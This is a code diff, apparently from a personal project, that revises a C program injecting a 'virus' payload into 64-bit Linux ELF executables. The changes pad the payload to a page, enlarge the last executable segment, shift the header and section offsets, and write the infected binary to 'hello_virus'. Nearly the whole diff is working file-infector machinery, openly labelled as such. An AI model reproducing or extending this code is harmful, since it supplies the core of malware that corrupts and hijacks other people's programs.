@@ -9,6 +9,8 @@
 
 #include "debug.h"
 
+#define PAGE_SIZE 0x1000
+
 struct file_info
 {
 	int fd;
@@ -26,7 +28,6 @@ int get_shdr_table(void *elf_header, Elf64_Shdr **shdr_table)
 						+ header->e_shoff);
 	return header->e_shnum;
 }
-
 
 int get_phdr_table(void *elf_header, Elf64_Phdr **phdr_table)
 {
@@ -127,9 +128,8 @@ unsigned get_align_num(unsigned old_size, unsigned add_size, unsigned align)
 	return (remainder + add_size) / align;
 }
 
-
-void adjust_seg_after_target(void *elf, unsigned vaddr_end,
-					unsigned mem_offset,
+void adjust_seg_after_target(void *elf,// unsigned vaddr_end,
+					//unsigned mem_offset,
 					unsigned phoff_base,
 					unsigned file_offset)
 {
@@ -143,10 +143,10 @@ void adjust_seg_after_target(void *elf, unsigned vaddr_end,
 
 	for ( i = 0; i < phdr_size; i++) {
 		Elf64_Phdr *tmp = &phdr_table[i];
-		if (tmp->p_vaddr > vaddr_end)
-			tmp->p_vaddr += mem_offset;
+		// if (tmp->p_vaddr > vaddr_end)
+			// tmp->p_vaddr += mem_offset;
 
-		if (tmp->p_offset > phoff_base)
+		if (tmp->p_offset >= phoff_base)
 			tmp->p_offset += file_offset;
 		debug("p_vaddr is %lx\n", tmp->p_vaddr);
 	}
@@ -166,31 +166,33 @@ void adjust_sec_after_target(void *elf, unsigned phoff_end,
 
 	for ( i = 0; i < shdr_size; i++) {
 		Elf64_Shdr *tmp = &shdr_table[i];
-		if (tmp->sh_offset > phoff_end)
+		if (tmp->sh_offset >= phoff_end)
 			tmp->sh_offset += file_offset;
 	}
 
 }
 
-void insert_virus(void *virus_elf, unsigned elf_size,
+int insert_virus(void *virus_elf, unsigned elf_size,
 			void *virus, unsigned virus_size,
-			unsigned insert_loc)
+			unsigned insert_loc, unsigned file_offset)
 {
-	memcpy((unsigned char *)virus_elf + insert_loc + virus_size,
-			(unsigned char *)virus_elf + insert_loc,
-			elf_size - insert_loc);
+	unsigned remainder = elf_size - insert_loc;
+	void *tmp = calloc(1, remainder);
+	if (tmp == NULL)
+		return -1;
+	memcpy(tmp, (unsigned char *)virus_elf + insert_loc, remainder);
+	memcpy((unsigned char *)virus_elf + insert_loc + file_offset, tmp, remainder);
 	memcpy((unsigned char *)virus_elf + insert_loc, virus, virus_size);
+	return 0;
 }
 
 int write_file(void *handle, unsigned size)
 {
 	int fd;
 
-	fd = open("hello_virus", O_RDWR | O_CREAT);
-
+	fd = open("hello_virus", O_RDWR | O_CREAT | O_TRUNC);
 	if (fd < 0)
 		return -1;
-
 	if (write(fd, handle, size) < size)
 		return -1;
 	close(fd);
@@ -199,8 +201,10 @@ int write_file(void *handle, unsigned size)
 
 int generate_virus_elf(void *victim, int elf_size, void *virus, int virus_size)
 {
-	unsigned align_num;
-	unsigned new_vaddr;
+	// unsigned align_num;
+	unsigned page_num;
+	unsigned file_offset;
+	// unsigned new_vaddr;
 	unsigned insert_loc;
 	Elf64_Phdr *target_seg;
 	void *virus_elf;
@@ -213,38 +217,50 @@ int generate_virus_elf(void *victim, int elf_size, void *virus, int virus_size)
 
 	memcpy(virus_elf, victim, elf_size);
 
+	page_num = virus_size / PAGE_SIZE + 1;
+	if (page_num > 1) {
+		printf("virus size is unsupported. bigger than %x\n", PAGE_SIZE);
+		return -1;
+	}
+	file_offset = page_num * PAGE_SIZE;
+
 	target_seg = get_last_exec_segment(virus_elf);
 	if (target_seg == NULL)
 		return -1;
 
-	align_num = get_align_num(target_seg->p_memsz,
-				virus_size, target_seg->p_align);
+	// if we need to relocate the vaddr of every segment
+	// align_num = get_align_num(target_seg->p_memsz,
+				// file_offset, target_seg->p_align);
 
-	if (align_num > 0) {
-		new_vaddr = target_seg->p_vaddr
-				+ (align_num + 1) * target_seg->p_align;
-		adjust_seg_after_target(virus_elf, new_vaddr,
-						target_seg->p_align
-						* align_num,
-						target_seg->p_offset,
-						virus_size);
-	}
+	// if (align_num > 0) {
+		// new_vaddr = target_seg->p_vaddr
+				// + (align_num + 1) * target_seg->p_align;
+		// adjust_seg_after_target(virus_elf, new_vaddr,
+						// target_seg->p_align
+						// * align_num,
+						// target_seg->p_offset,
+						// virus_size);
+	// }
 
 	insert_loc = target_seg->p_offset + target_seg->p_filesz;
-	adjust_sec_after_target(virus_elf, insert_loc, virus_size);
+	adjust_seg_after_target(virus_elf, insert_loc, file_offset);
+	adjust_sec_after_target(virus_elf, insert_loc, file_offset);
 
 	Elf64_Ehdr *tmp_header = (Elf64_Ehdr *)virus_elf;
-	if (target_seg->p_offset < tmp_header->e_phoff)
-		tmp_header->e_phoff += virus_size;
+	debug("insert_loc = %x, seg_off = %lx\n", insert_loc, target_seg->p_offset);
+	if (insert_loc < tmp_header->e_phoff)
+		tmp_header->e_phoff += file_offset;
 
-	if (target_seg->p_offset < tmp_header->e_shoff)
-		tmp_header->e_shoff += virus_size;
+	if (insert_loc < tmp_header->e_shoff)
+		tmp_header->e_shoff += file_offset;
 
-	target_seg->p_memsz += virus_size;
-	target_seg->p_filesz += virus_size;
+	target_seg->p_memsz += file_offset;
+	target_seg->p_filesz += file_offset;
 
-	insert_virus(virus_elf, elf_size, virus, virus_size, insert_loc);
-	if (write_file(virus_elf, elf_size+virus_size) != 0)
+	insert_virus(virus_elf, elf_size, virus, virus_size,
+					insert_loc, file_offset);
+	debug("file size should be %x", elf_size + file_offset);
+	if (write_file(virus_elf, elf_size + file_offset) != 0)
 		return -1;
 	return 0;
 }
